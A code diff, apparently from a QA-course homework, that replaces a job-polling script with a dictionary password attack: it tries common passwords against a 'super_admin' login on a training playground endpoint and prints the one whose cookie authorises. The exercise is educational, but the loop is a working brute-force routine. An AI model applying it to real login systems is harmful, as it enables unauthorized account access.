@@ -1,42 +1,24 @@
-import time
 import requests
 
-response1 = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job")
-token_value = response1.json()
-token = token_value['token']
-seconds_value=response1.json()
-seconds = seconds_value['seconds']
-print(response1.text)
+password = ["password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football",	"1234567", "monkey", "111111",
+"letmein", "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "princess", "adobe123", "123123", "welcome",
+"login", "admin", "qwerty123", "solo", "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212",
+"starwars", "654321", "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael", "!@#$%^&*", "jesus",
+"password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme",
+"whatever", "donald", "batman", "zaq1zaq1", "Football", "000000", "123qwe"]
 
-response2 =requests.get("https://playground.learnqa.ru/ajax/api/longtime_job", params={'token':token})
-print(response2.text)
-status_value = response2.json()
-status = status_value['status']
+for pas in password:
+    payload = {"login":"super_admin", "password":pas}
+    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
+    cookie_value = response1.cookies.get('auth_cookie')
+    cookies = {'auth_cookie':cookie_value}
 
-if status == "Job is NOT ready":
-    print("Задача еще не готова, статус верный")
+    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
 
-    time.sleep(seconds+1)
-
-    response3 =requests.get("https://playground.learnqa.ru/ajax/api/longtime_job", params={'token':token})
-    print(response3.text)
-    status_value = response3.json()
-    status = status_value['status']
-    result_value = response3.json()
-    result = result_value['result']
-
-    if status == "Job is ready":
-        print("Задача готова, статус верный")
-
-        if result != "":
-            print("Результат есть")
-
-        else:
-            print("Пустой результат")
+    if  response2.text == "You are NOT authorized":
+        response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
 
     else:
-        print("Статус неверный")
-
-else:
-    print("Статус неверный")
+        print(response2.text)
+        print("Пароль -", pas)
 
